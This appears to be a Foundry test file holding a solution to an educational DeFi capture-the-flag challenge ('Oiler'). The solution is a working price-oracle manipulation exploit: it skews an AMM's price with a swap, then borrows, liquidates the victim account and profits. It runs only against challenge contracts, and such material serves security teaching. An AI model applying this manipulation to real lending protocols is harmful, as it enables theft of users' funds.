// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Oiler} from "../src/8_oiler/Oiler.sol";
import {AMM} from "../src/8_oiler/AMM.sol";

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge8Test is Test {
    Oiler public oiler;
    AMM public amm;

    ERC20 token;
    ERC20 dai;

    address player;
    address superman;

    function setUp() public {
        /**
         * @notice Create ERC20 tokens
         */
        token = new ERC20("Token", "TKN");
        dai = new ERC20("DAI token", "DAI");
        vm.label(address(token), "TKN");
        vm.label(address(dai), "DAI");

        /**
         * @notice Deploy contant prodcut AMM with a TOKEN <> DAI pair
         */
        amm = new AMM(address(token), address(dai));
        vm.label(address(amm), "amm");

        /**
         * @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and
         * mints a 'dTOKEN' underlying debt token.
         */
        oiler = new Oiler(address(token), address(amm));
        vm.label(address(oiler), "oiler");

        /**
         * @notice Create 2 accounts and fund them.
         * - Player starts with 100 TOKEN and 100 DAI
         * - Superman starts with 200 TOKEN and 200 DAI,
         * Superman adds 100 of each to the pool.
         */
        player = makeAddr("player");
        superman = makeAddr("Super-man");
        deal(address(token), player, 100);
        deal(address(dai), player, 100);
        deal(address(token), superman, 200);
        deal(address(dai), superman, 200);

        /**
         * @notice Add liquidity to AMM pair.
         */
        vm.startPrank(superman);
        token.approve(address(amm), type(uint256).max);
        dai.approve(address(amm), type(uint256).max);
        amm.addLiquidity(100, 100);
        vm.stopPrank();
    }


    function testSolution()public {
        // Victim set up
        vm.startPrank(superman);
        token.approve(address(oiler), 100);
        oiler.deposit(100);
        oiler.maxBorrow(superman); // Always account for 2 Decimal places
        oiler.borrow(75);
        oiler.healthFactor(superman);
        vm.stopPrank();


        // Player initial balance is of 100 $TOKEN and 100 $DAI
        console.log("Initial token balance: ", token.balanceOf(player));
        console.log("Initial dai balance: ", dai.balanceOf(player));
        vm.startPrank(player);
        /*////////////////////////////////////////////////////
        //            Add your attack logic below!          //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge8Test -vvvv //
        ////////////////////////////////////////////////////*/

        token.approve(address(amm), type(uint256).max);
        dai.approve(address(amm), type(uint256).max);
        token.approve(address(oiler), type(uint256).max);

        // Step 1. unbalance the pool where the oiler fetches the price
        amm.swap(address(token), 70);
        oiler.healthFactor(superman);
        // Step 2. deposit into the oiler so that we can borrow dTokens to be able to liquidate supermans position
        oiler.deposit(30);
        console.log("amount we need to put up for liquidation: ", oiler.getUserData(superman).borrow * 5 / 100);
        console.log("amount of dTOKEN we can borrow with our deposit: ", oiler.maxBorrow(player) / 10**18);
        oiler.borrow(5);
        // Step 3. liquidate superman withdraw our tokens from the contract and get as tokens from the pool
        oiler.liquidate(superman);
        oiler.withdraw(oiler.balanceOf(player));
        amm.swap(address(dai), dai.balanceOf(player));

        //==================================================//
        vm.stopPrank();

        // Conditions to pass:
        //      - Player has liquidated the victim
        //      - Player has more than 150 $TOKENs
        //      - Extra: Player has more than 200 $TOKENs
        Oiler.User memory victim = oiler.getUserData(superman);
        assertEq(victim.liquidated, true);
        assert(token.balanceOf(player) > 200);

    }

}
